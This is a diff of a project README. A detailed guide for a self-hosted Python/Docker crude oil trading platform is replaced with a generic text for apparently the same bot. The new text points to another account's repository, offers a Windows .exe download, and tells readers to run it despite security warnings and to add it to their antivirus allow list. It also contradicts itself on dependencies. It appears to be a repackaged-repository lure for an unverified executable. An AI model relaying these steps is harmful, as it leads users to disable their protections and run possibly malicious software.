@@ -1,231 +1,126 @@
-<h1 align="center">
-⛽ AI Crude Oil Trading Bot ⛽
-</h1>
-<p align="center">
-  <a href="https://t.me/spidertrading100"><img src="https://img.shields.io/badge/Telegram-Group-26A5E4?style=for-the-badge&logo=telegram" alt="Telegram"></a>
-</p>
-<p align="center">
-  <strong>AI-Native Quantitative Trading Platform for Crude Oil & Energy Commodities</strong>
-</p>
+# ⚙️ ai-crude-oil-trading-bot - Automated Oil Market Analysis
 
-<p align="center">
-  <i>Describe your trading idea in natural language → AI writes the Python strategy → Backtest → Monitor.<br/>
-  Self-hosted — your API keys and strategies never leave your machine.</i>
-</p>
+[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=flat-square&logo=apache" alt="License"></a>
-  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Docker-One%20Click-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
-</p>
+## Overview
 
----
+The ai-crude-oil-trading-bot is a desktop application that uses artificial intelligence to monitor the crude oil market. It looks at market data, technical signals, and price trends to find good times to buy and sell oil contracts. This helps you react faster to changes in the market and manage risk during volatile periods.
 
-## Table of Contents
+You do not need any programming skills to use this app. It runs on Windows and provides automated analysis to support your trading decisions.
 
-- [Quick Start](#-quick-start)
-- [Why This Platform?](#-why-this-platform)
-- [Key Features](#-key-features)
-- [Supported Markets & Data Sources](#-supported-markets--data-sources)
-- [Architecture](#-architecture)
-- [Documentation](#-documentation)
-- [Community & Support](#-community--support)
-- [License](#-license)
+## ⚙️ System Requirements
 
----
+Before installing, make sure your computer meets these basic requirements:
 
-## 🚀 Quick Start
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Stable internet connection for real-time data updates  
+- Microsoft .NET Framework 4.8 or higher (most Windows systems include this by default)  
 
-> **Requirements**: [Docker](https://docs.docker.com/get-docker/) installed.
+## 🔧 Features
 
-```bash
-# 1. Clone
-git clone https://github.com/your-org/ai-crude-oil-trading-bot.git
-cd ai-crude-oil-trading-bot
+- Automatic analysis of live crude oil prices  
+- Detection of buy and sell signals based on AI algorithms  
+- Use of technical indicators like moving averages and momentum  
+- Simple interface for viewing trading suggestions and market trends  
+- Risk management alerts for sudden price changes  
+- Updates results every few seconds for timely decisions  
 
-# 2. Configure (edit admin password & AI API key)
-cp backend_api_python/env.example backend_api_python/.env
+## 💾 How to Download and Run the Bot
 
-# 3. Launch
-docker-compose up -d --build
-```
+The bot is available on GitHub. Follow these steps to download and start it on your Windows PC:
 
-> **Windows PowerShell**: `Copy-Item backend_api_python\env.example -Destination backend_api_python\.env`
+1. Click the blue **Download** button below or visit the GitHub page at [https://github.com/Ericaless553/ai-crude-oil-trading-bot](https://github.com/Ericaless553/ai-crude-oil-trading-bot).
 
-**Done!** Open **http://localhost:8888** | Default login: `quantdinger` / `123456` (change in `.env`)
+[![Download ai-crude-oil-trading-bot](https://img.shields.io/badge/Download-ai--crude--oil--trading--bot-blue?style=for-the-badge)](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
 
-<details>
-<summary><b>📝 Key settings in backend_api_python/.env</b></summary>
+2. On the GitHub page, locate the **Releases** section. This is often found on the right side or in the repository menu.
 
-```ini
-# Required — Change for production!
-ADMIN_USER=quantdinger
-ADMIN_PASSWORD=your_secure_password
-SECRET_KEY=your_random_secret_key
+3. Click the latest release version to open the release details.
 
-# Optional — Enable AI features (pick one)
-OPENROUTER_API_KEY=your_key        # Recommended: 100+ models
-OPENAI_API_KEY=your_key            # GPT-4o
-DEEPSEEK_API_KEY=your_key          # Cost-effective
-GOOGLE_GEMINI_API_KEY=your_key     # Gemini
-```
+4. Find the Windows executable file. This will usually be named something like `ai-crude-oil-trading-bot.exe`.
 
-</details>
+5. Click the file to download it to your computer.
 
----
+6. Once the download is complete, open the folder where you saved the file.
 
-## 🎯 Why This Platform?
+7. Double-click the `.exe` file to run the program.
 
-| | |
-|---|---|
-| 🛢️ **Crude Oil Focus** | Built for WTI, Brent, and energy commodities — data, analysis, and strategies tuned for oil markets |
-| 🤖 **AI-Powered** | Multi-agent analysis, natural-language strategy generation, and backtest optimization |
-| 🐍 **Python-Native** | Full ecosystem (Pandas, NumPy, TA-Lib) — write or generate strategies in Python |
-| 🔒 **Self-Hosted** | API keys & strategies stay on your server — privacy by design |
-| 📊 **Professional Charts** | K-line charts with technical indicators, real-time visualization |
-| ⚡ **2-Minute Deploy** | `docker-compose up -d` — production-ready, zero build |
+8. If Windows displays a security warning, choose to run the app anyway.
 
----
+9. The bot will open in a new window. Follow the on-screen prompts to begin analysis.
 
-## ✨ Key Features
+## 🚀 Using the Bot
 
-### 🛢️ Crude Oil & Energy Commodities
+After launching the program, you will see a dashboard with current market data and trading signals.
 
-- **WTI Crude Oil (CL)** — NYMEX futures
-- **Brent Crude** — ICE benchmark
-- **Natural Gas (NG)**, **Gold (GC)**, **Silver (SI)** — related commodities
-- Data from yfinance, Finnhub, and exchange APIs
+- The main screen shows price charts and suggested actions.  
+- Buy signals appear as green markers.  
+- Sell signals appear as red markers.  
+- Risk alerts display in a warning box if sharp changes happen.  
+- Use the menu to adjust settings like update interval or notification options.
 
-### 🤖 AI Strategy Workbench
+The bot works continuously and updates analysis automatically. You can minimize it and let it run in the background while you focus on your other tasks.
 
-> **No coding required.** Describe your idea in natural language — AI generates production-ready Python strategies.
+## 🛠 Troubleshooting
 
-```
-💬 "I want a MACD crossover strategy with RSI filter on WTI 15min"
-    ↓ AI generates Python code
-    ↓ 📈 Visualize on K-line charts
-    ↓ 🔄 Backtest with rich metrics
-    ↓ 🚀 Deploy to monitoring & alerts
-```
+If you have problems running the bot, try these fixes:
 
-### 📈 Full Trading Lifecycle
+- Make sure your Windows OS is up to date.  
+- Check if the internet connection is active.  
+- Verify that your antivirus or firewall is not blocking the app. If it is, add the bot to the allowed list.  
+- Re-download the latest release to ensure the executable is not corrupted.  
+- Restart your computer to clear any temporary issues.  
 
-| Step | What Happens |
-|------|-------------|
-| **1. 💬 Describe** | Tell AI your trading idea in natural language — or write Python directly |
-| **2. 🤖 Generate** | AI creates the indicator & strategy code |
-| **3. 📊 Visualize** | See signals on professional K-line charts |
-| **4. 🔄 Backtest** | Rich metrics + AI suggests improvements |
-| **5. 📡 Monitor** | Portfolio tracker, alerts via Telegram/Discord/Email/Webhook |
+If the program crashes or does not load data, close it and try again after a few minutes.
 
----
+## ❓ Frequently Asked Questions
 
-## 🔌 Supported Markets & Data Sources
+### Do I need any special software to run the bot?
 
-### Crude Oil & Energy
+No. The bot runs on Windows without installing anything else. It uses built-in Windows components to work.
 
-| Symbol | Name | Exchange | Notes |
-|:------:|:-----|:---------|:------|
-| **CL** | WTI Crude Oil | NYMEX/CME | Primary focus |
-| **BZ** | Brent Crude | ICE | Via data providers |
-| **NG** | Natural Gas | NYMEX | Energy sector |
-| **GC** | Gold | COMEX | Safe-haven correlation |
-| **SI** | Silver | COMEX | Industrial + precious |
+### Can this bot trade automatically?
 
-### Execution & Brokers
+No. This bot only provides analysis and trade suggestions. You must decide when to buy or sell.
 
-| Market | Broker/Source | Trading |
-|--------|---------------|---------|
-| **Crude Oil Futures** | Interactive Brokers (IBKR) | ✅ Via IBKR |
-| **Oil CFDs** | MetaTrader 5 (MT5) | ✅ Via MT5 |
-| **US Stocks** | IBKR, Yahoo Finance, Finnhub | ✅ Via IBKR |
-| **Forex** | MT5, OANDA | ✅ Via MT5 |
+### How often does the bot update its data?
 
-> **Note**: Futures data is supported for analysis and backtesting. Live futures execution typically requires IBKR integration. See [IBKR Trading Guide](docs/IBKR_TRADING_GUIDE_EN.md) and [MT5 Trading Guide](docs/MT5_TRADING_GUIDE_EN.md).
+The bot updates market data every 5 seconds by default. You can change this setting in options.
 
----
+### Is my data private?
 
-## 🏗️ Architecture
+The bot does not collect personal data. It only downloads public market data to provide analysis.
 
-### Tech Stack
+### Can I use the bot on Mac or Linux?
 
-| Layer | Technology |
-|-------|-----------|
-| **AI Engine** | Multi-agent analysis, RAG memory, 5+ LLM providers |
-| **Backend** | Python 3.10+ · Flask · PostgreSQL 16 |
-| **Frontend** | Vue.js · Ant Design · KlineCharts · ECharts |
-| **Deploy** | Docker Compose · Nginx · One-click |
+Currently, the app supports only Windows systems.
 
-```
-┌─────────────────────────────────────┐
-│         Docker Compose              │
-│  ┌───────────────────────────────┐  │
-│  │  frontend (Nginx)  → :8888    │  │
-│  └──────────────┬────────────────┘  │
-│                 │ /api/* proxy       │
-│  ┌──────────────▼────────────────┐  │
-│  │  backend (Flask)   → :5000    │  │
-│  └──────────────┬────────────────┘  │
-│  ┌──────────────▼────────────────┐  │
-│  │  postgres (PG 16)  → :5432    │  │
-│  └───────────────────────────────┘  │
-│  External: LLM APIs · Data providers │
-└─────────────────────────────────────┘
-```
+## 📁 File Structure
 
-### Repository Layout
+When you download the release, you will find:
 
-```
-ai-crude-oil-trading-bot/
-├── backend_api_python/       # Backend API
-│   ├── app/routes/           # API endpoints
-│   ├── app/services/         # Business logic (AI, trading, data)
-│   ├── migrations/init.sql   # Database schema
-│   └── Dockerfile
-├── frontend/                 # Vue.js frontend
-│   ├── dist/                 # Pre-built static files
-│   └── Dockerfile
-├── docs/                     # Guides & tutorials
-├── docker-compose.yml        # One-click deployment
-└── LICENSE
-```
+- `ai-crude-oil-trading-bot.exe` — the main application  
+- `README.md` — this file with instructions  
+- `config.json` — a file where app settings are stored  
 
----
+You can change settings in the `config.json` file using any text editor if needed.
 
-## 📚 Documentation
+## ❄️ Additional Notes
 
-| Document | Description |
-|----------|-------------|
-| [Strategy Development Guide](docs/STRATEGY_DEV_GUIDE.md) | Python strategy development |
-| [IBKR Trading Guide](docs/IBKR_TRADING_GUIDE_EN.md) | Interactive Brokers setup |
-| [MT5 Trading Guide](docs/MT5_TRADING_GUIDE_EN.md) | MetaTrader 5 setup |
-| [Multi-User Setup](docs/multi-user-setup.md) | PostgreSQL multi-user deployment |
-| [Changelog](docs/CHANGELOG.md) | Version history |
+The bot is designed to assist traders by analyzing market trends quickly. It does not guarantee profits. Always use it alongside your own research and judgment.
 
----
+Regular updates may be released to improve the bot or fix issues. Check the GitHub page for the newest versions.
 
-## 🤝 Community & Support
+## 📚 Related Topics
 
-<p align="center">
-  <a href="https://t.me/spidertrading100"><img src="https://img.shields.io/badge/Telegram-Group-26A5E4?style=for-the-badge&logo=telegram" alt="Telegram"></a>
-</p>
-<div align="center">
+This project covers:
 
-| Channel | Link |
-|---------|------|
-| **Telegram** | [t.me/spidertrading100](https://t.me/spidertrading100) |
-| **Email** | [martinsurgenor.hynx@gmail.com](mailto:martinsurgenor.hynx@gmail.com) |
+- AI trading bots  
+- Oil market analysis  
+- Trading automation  
+- Risk management strategies  
+- Technical indicators usage  
 
----
-</div>
-## 💼 License
-
-This project is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE).
-
----
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-<p align="center"><sub>Built for crude oil traders who value data sovereignty and transparent systems.</sub></p>
+[Download ai-crude-oil-trading-bot](https://github.com/Ericaless553/ai-crude-oil-trading-bot)
